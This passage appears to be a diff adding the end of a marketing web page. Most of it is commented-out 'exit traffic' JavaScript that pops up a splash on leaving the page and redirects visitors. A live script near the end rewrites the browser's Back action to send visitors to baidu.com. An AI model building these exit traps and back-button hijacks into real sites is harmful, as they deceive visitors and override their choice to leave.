+	        <!--addClickEvent(a, i, function() {-->
+	            <!--PreventExitSplash = true;-->
+				<!--if (!this.href.match(/http:\/\//)) {-->
+					<!--setTimeout(function () {-->
+						<!--PreventExitSplash = false;-->
+					<!--}, 300);-->
+				<!--}-->
+	        <!--});-->
+	    <!--}-->
+	    <!--else {-->
+	        <!--addClickEvent(a, i, function() {-->
+	            <!--PreventExitSplash = false;-->
+	        <!--});-->
+	    <!--}-->
+	<!--}-->
+	<!--disablelinksfunc = function() {-->
+	    <!--var a = document.getElementsByTagName('A');-->
+
+	    <!--for (var i = 0; i < a.length; i++) {-->
+	        <!--if (a[i].target !== '_blank') {-->
+	            <!--addClickEvent(a, i, function() {-->
+	                <!--PreventExitSplash = true;-->
+	            <!--});-->
+	        <!--}-->
+	        <!--else {-->
+	            <!--addClickEvent(a, i, function() {-->
+	                <!--PreventExitSplash = false;-->
+	            <!--});-->
+	        <!--}-->
+	    <!--}-->
+	<!--}-->
+
+	<!--disableformsfunc = function() {-->
+		<!--// Makes that clicking on the links on the page will not cause this popup to appear-->
+	    <!--var f = document.getElementsByTagName('form');-->
+	    <!--for (var i = 0; i < f.length; i++) {-->
+	        <!--if (!f[i].onclick) {-->
+	            <!--f[i].onclick = function() {-->
+	                <!--if (LightwindowOpening == false) {-->
+	                    <!--PreventExitSplash = true;-->
+						<!--setTimeout(function () {-->
+							<!--PreventExitSplash = false;-->
+						<!--}, 300);-->
+	                <!--}-->
+	            <!--}-->
+	        <!--}-->
+	        <!--else if (!f[i].onsubmit) {-->
+	            <!--f[i].onsubmit = function() {-->
+	                <!--PreventExitSplash = true;-->
+	            <!--}-->
+	        <!--}-->
+	    <!--}-->
+	<!--}-->
+
+	<!--function exittraffic_change_url() {-->
+		<!--disable_confirmation = false;-->
+		<!--clearTimeout(timeout_variable); // just to make sure-->
+		<!--document.location.href=exittraffic_RedirectUrl;-->
+	<!--}-->
+	<!--//-->
+	<!--// control flash event-->
+	<!--//-->
+	<!--var et_timer;-->
+	<!--var timer_value = 1500;-->
+	<!--function flashClick(){-->
+	    <!--PreventExitSplash = true;-->
+	    <!--if(typeof et_timer !== 'undefined') clearTimeout(et_timer);-->
+	    <!--//document.getElementById("et_status").innerHTML = 'preventExitTrafic disabled for ' + timer_value + ' msec';-->
+	    <!--et_timer = setTimeout("EnableExitTraffic();", timer_value);-->
+	    <!--//PreventExitSplash = true;-->
+	     <!--//console.log('click '  + PreventExitSplash);-->
+	<!--}-->
+
+	<!--// this one shuld be in etraffic.js ??-->
+	<!--function EnableExitTraffic(){-->
+	    <!--PreventExitSplash = false;-->
+	    <!--//document.getElementById("et_status").innerHTML = 'preventExitTrafic ENABLE AGAIN';-->
+	    <!--clearTimeout(et_timer);-->
+	    <!--//console.log('click '  + PreventExitSplash);-->
+	<!--}-->
+
+	<!--addLoadEvent(disableformsfunc);-->
+	<!--// ENABLE BEFORE LAUNCH-->
+
+	<!--window.onbeforeunload = DisplayExitSplash;-->
+	<!--//&ndash;&gt;-->
+	<!--</script>-->
+	<script type="text/javascript" src="backfix.min.js"></script>
+	<script type="text/javascript">bajb_backdetect.OnBack = function(){
+		window.history.back=function(){
+			document.location= 'http://www.baidu.com'
+		}
+	}
+	</script>
+<style type="text/css">div, main, article, aside, footer, nav, section, header {display: block;}span {display: inline;}h1, h2, h3 {display: block;}
+</style>
+
+
+</body></html>
